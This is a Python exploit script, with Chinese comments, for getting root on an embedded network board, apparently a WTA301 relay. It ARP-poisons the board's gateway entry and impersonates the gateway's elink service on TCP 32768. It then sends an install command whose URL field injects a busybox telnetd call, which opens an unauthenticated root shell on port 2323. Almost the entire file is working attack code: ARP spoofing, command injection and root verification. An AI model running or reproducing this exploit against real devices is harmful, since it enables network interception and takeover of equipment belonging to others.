# ============================================================================
# ⚠️ 本脚本会【临时占用 <网关IP>/32】，单网卡拓扑下运行期间本机断网。
#    优先用同目录的 rawtcp_gw.py（不需要别名、不断网）。
# ============================================================================

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""getroot3.py —— ARP 毒化 + 本地占用网关 IP，等板子连 TCP 32768

为什么用这条路（有证据，不是猜）：
  elinkclt 里字符串表顺序：
      22afe  192.168.1.1
      22b0a  32768
      22b10  (elink) connect "%s:%s" (%d)      ← 硬编码兜底：连网关:32768
      22b90  LOCATION:
      22b9a  (ssdp) gw ip %s
      22bca  (ssdp) connect "%s:%s"
  SSDP 应答被无视（实测：18 次 M-SEARCH、10 种 LOCATION 格式、源 IP 伪造成网关
  也全都零连接），所以走硬编码兜底那条：板子自己会去连 <网关>:32768。
  把板子 ARP 表里 <网关> 的 MAC 改成我们的，这条 TCP 就落到本机。

拓扑：板子是桥接中继，<网关> 是上游路由器。我们只毒化【板子】一条 ARP 记录
（单播 ARP 应答，不广播），上游路由器和其他设备不受影响。

风险与善后：本机要临时占用 <网关>/32 才能收到这条 TCP（Windows 强主机模型）。
  占用期间本机断网（正常，不需要）。脚本退出时【必定】删掉别名。

用法：
    python getroot3.py --ip 192.168.1.175 --wait 240
"""
import argparse
import json
import os
import re
import subprocess
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
HERE = os.path.dirname(os.path.abspath(__file__))
os.chdir(HERE)
PY = sys.executable

SRV_PORT   = int(os.environ.get('SRV_PORT', '8099'))
SHELL_PORT = int(os.environ.get('SHELL_PORT', '2323'))
ELINK_PORT = int(os.environ.get('ELINK_PORT', '32768'))
LOG = os.path.join(HERE, 'getroot3.log')


def log(*a):
    line = time.strftime('[%H:%M:%S] ') + ' '.join(str(x) for x in a)
    print(line, flush=True)
    with open(LOG, 'a', encoding='utf-8') as f:
        f.write(line + '\n')


def sh(*a):
    try:
        r = subprocess.run(a, capture_output=True, timeout=30)
        for enc in ('gbk', 'utf-8'):
            try:
                return r.stdout.decode(enc)
            except Exception:
                pass
        return r.stdout.decode('gbk', 'replace')
    except Exception:
        return ''


def ps(cmd):
    return sh('powershell', '-NoProfile', '-Command', cmd)


# ------------------------------------------------------------------ 探测
def detect():
    info = {}
    out = ps("Get-NetIPConfiguration | Where-Object {$_.IPv4Address -and "
             "$_.NetAdapter.Status -eq 'Up'} | ForEach-Object { "
             "'{0}|{1}|{2}|{3}' -f $_.InterfaceAlias,$_.InterfaceIndex,"
             "$_.IPv4Address.IPAddress,$_.IPv4DefaultGateway.NextHop }")
    cands = []
    for line in out.splitlines():
        p = line.strip().split('|')
        if len(p) < 4:
            continue
        if re.search(r'WSL|Tailscale|VMware|VirtualBox|Loopback|vEthernet', p[0], re.I):
            continue
        cands.append(p)
    if not cands:
        raise SystemExit('!! 没有可用物理网卡')
    cands.sort(key=lambda c: (c[3] == '',))
    alias, idx, ip, gw = cands[0]
    if not gw:
        raise SystemExit('!! 本机没有默认网关，无法确定要冒充谁')
    info.update(iface=alias, ifindex=idx, my_ip=ip, gw_ip=gw)
    m = ps("(Get-NetAdapter -InterfaceIndex %s).MacAddress" % idx).strip()
    info['my_mac'] = m.replace('-', ':').upper() if re.match(
        r'^([0-9A-Fa-f]{2}-){5}[0-9A-Fa-f]{2}$', m) else ''
    info['subnet'] = '.'.join(ip.split('.')[:3]) + '.'
    return info


def arp_mac(ip):
    sh('ping', '-n', '1', '-w', '800', ip)
    m = re.search(r'(' + re.escape(ip) + r')\s+([0-9a-fA-F-]{17})', sh('arp', '-a', ip))
    return m.group(2).replace('-', ':').upper() if m else ''


def find_board(hint):
    if hint:
        return hint, arp_mac(hint)
    raise SystemExit('!! 请用 --ip 指定板子 IP')


def port_open(ip, port, t=1.0):
    import socket
    try:
        socket.create_connection((ip, port), t).close()
        return True
    except Exception:
        return False


def verify_root(ip):
    import socket
    try:
        s = socket.create_connection((ip, SHELL_PORT), 8)
    except Exception as e:
        return False, repr(e)
    s.settimeout(6)
    time.sleep(1.5)
    try:
        s.recv(65535)
    except Exception:
        pass
    txt = ''
    try:
        s.sendall(b'id; uname -a\n')
        time.sleep(1.8)
        txt = s.recv(65535).decode('utf-8', 'replace')
    except Exception:
        pass
    s.close()
    return ('uid=0' in txt or 'root' in txt), txt.strip()[:400]


# ------------------------------------------------------------------ 别名
def add_alias(iface, ip):
    ps("Remove-NetIPAddress -IPAddress %s -Confirm:$false -EA SilentlyContinue | Out-Null" % ip)
    r = sh('netsh', 'interface', 'ipv4', 'add', 'address', 'name=' + iface,
           'address=' + ip, 'mask=255.255.255.255', 'skipassource=true')
    out = sh('netsh', 'interface', 'ipv4', 'show', 'addresses', 'name=' + iface)
    ok = re.search(re.escape(ip) + r'\b', out) is not None
    log('别名 %s/32 → %s : %s' % (ip, iface, 'OK' if ok else 'FAILED'))
    if not ok:
        log('  netsh 输出:', r.strip()[:300])
    return ok


def del_alias(iface, ip):
    ps("Remove-NetIPAddress -IPAddress %s -Confirm:$false -EA SilentlyContinue | Out-Null" % ip)
    time.sleep(1)
    out = sh('netsh', 'interface', 'ipv4', 'show', 'addresses', 'name=' + iface)
    log('别名已清理' if not re.search(re.escape(ip) + r'\b', out) else '!! 别名清理失败（请手动删）')


# ------------------------------------------------------------------ poison
class Poison(threading.Thread):
    def __init__(self, iface, my_mac, board_ip, board_mac, spoof_ip):
        super().__init__(daemon=True)
        self.iface, self.my_mac = iface, my_mac
        self.bip, self.bmac, self.spoof = board_ip, board_mac, spoof_ip
        self.stop_flag = False
        self.sent = 0
        self.err = ''

    def run(self):
        try:
            from scapy.all import Ether, ARP, sendp, conf
            conf.use_pcap = True
        except Exception as e:
            self.err = 'scapy 不可用: %r' % e
            log('!!', self.err)
            return
        pkt = (Ether(src=self.my_mac, dst=self.bmac) /
               ARP(op=2, hwsrc=self.my_mac, psrc=self.spoof,
                   hwdst=self.bmac, pdst=self.bip))
        while not self.stop_flag:
            try:
                sendp(pkt, iface=self.iface, verbose=False)
                self.sent += 1
            except Exception as e:
                self.err = repr(e)
            time.sleep(0.8)
        log('poison 停止，共发 %d 个 ARP 应答' % self.sent)

    def restore(self):
        """尽力把板子的 ARP 表恢复成真实网关 MAC。"""
        try:
            from scapy.all import Ether, ARP, sendp, conf, getmacbyip
            conf.use_pcap = True
            real = getmacbyip(self.spoof)
            if not real:
                return
            for _ in range(5):
                sendp(Ether(src=real, dst=self.bmac) /
                      ARP(op=2, hwsrc=real, psrc=self.spoof, hwdst=self.bmac, pdst=self.bip),
                      iface=self.iface, verbose=False)
                time.sleep(0.3)
            log('已向板子还原真实网关 MAC %s' % real)
        except Exception as e:
            log('还原失败（板子会自行重新 ARP）:', e)


def spawn(args, tag):
    f = open(os.path.join(HERE, tag + '.log'), 'a', encoding='utf-8', errors='replace')
    p = subprocess.Popen([PY] + args, stdout=f, stderr=subprocess.STDOUT, cwd=HERE)
    log('启动 %s (pid %d)' % (tag, p.pid))
    return p


def kill_port(port):
    out = ps("Get-NetTCPConnection -LocalPort %d -State Listen -EA SilentlyContinue | "
             "Select-Object -ExpandProperty OwningProcess" % port)
    for pid in set(out.split()):
        if pid.isdigit():
            sh('taskkill', '/F', '/PID', pid)


def payload(my_ip):
    return 'http://%s:%d/x;(/bin/busybox telnetd -l /bin/sh -p %d >/dev/null 2>&1 &);' % (
        my_ip, SRV_PORT, SHELL_PORT)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--ip', required=True)
    ap.add_argument('--wait', type=int, default=240)
    ap.add_argument('--keep', action='store_true')
    a = ap.parse_args()

    log('=' * 62)
    info = detect()
    for k in ('iface', 'ifindex', 'my_ip', 'my_mac', 'gw_ip'):
        log('  %-7s = %s' % (k, info.get(k)))
    ip = a.ip
    mac = arp_mac(ip)
    log('板子 = %s  MAC = %s' % (ip, mac))
    log('要冒充的网关 = %s' % info['gw_ip'])

    if port_open(ip, SHELL_PORT):
        ok, tail = verify_root(ip)
        if ok:
            log('=== 2323 已开且是 root：telnet %s %d ===' % (ip, SHELL_PORT))
            log(tail)
            return 0

    alias_ok = add_alias(info['iface'], info['gw_ip'])
    if not alias_ok:
        log('!! 别名没加上，板子的 TCP 会到不了本地 socket')

    ps("if (-not (Get-NetFirewallRule -DisplayName 'WTA301-g3' -EA SilentlyContinue)) {"
       "New-NetFirewallRule -DisplayName 'WTA301-g3' -Direction Inbound -Action Allow "
       "-Protocol TCP -LocalPort %d,%d -Profile Any | Out-Null }" % (ELINK_PORT, SHELL_PORT))

    kill_port(SRV_PORT)
    srv = spawn(['srv.py', '--port', str(SRV_PORT)], 'srv')
    time.sleep(1)
    kill_port(ELINK_PORT)
    pl = payload(info['my_ip'])
    log('注入载荷: %s' % pl)
    env = dict(os.environ, ELINK_PORT=str(ELINK_PORT))
    f = open(os.path.join(HERE, 'elink.log'), 'a', encoding='utf-8', errors='replace')
    gw = subprocess.Popen([PY, 'elink_gw4.py', str(a.wait), 'ctcapd.appd', 'install',
                           json.dumps({'url': pl})],
                          stdout=f, stderr=subprocess.STDOUT, cwd=HERE, env=env)
    log('启动 elink (pid %d) 监听 TCP %d' % (gw.pid, ELINK_PORT))
    time.sleep(1)

    poi = Poison(info['iface'], info['my_mac'], ip, mac, info['gw_ip'])
    poi.start()

    log('等待板子连过来（每 0.8s 一次 ARP 应答）…')
    t0 = time.time()
    last = 0
    try:
        while time.time() - t0 < a.wait:
            if port_open(ip, SHELL_PORT):
                time.sleep(2)
                ok, tail = verify_root(ip)
                if ok:
                    log('=' * 62)
                    log('=== 成功！root shell: telnet %s %d ===' % (ip, SHELL_PORT))
                    log(tail)
                    return 0
                log('2323 开了但验证异常:', tail)
            if time.time() - last > 20:
                last = time.time()
                log('…%ds  ARP=%d  %s' % (time.time() - t0, poi.sent,
                                          ('poison错误:' + poi.err) if poi.err else ''))
            time.sleep(2)
        log('!! 超时。检查 elink.log 里有没有 accept')
        return 1
    finally:
        try:
            poi.stop_flag = True
            time.sleep(1)
            poi.restore()
        except Exception:
            pass
        del_alias(info['iface'], info['gw_ip'])
        if not a.keep:
            for p_, n_ in ((gw, 'elink'), (srv, 'srv')):
                try:
                    p_.terminate()
                    log('已停止', n_)
                except Exception:
                    pass


if __name__ == '__main__':
    sys.exit(main())
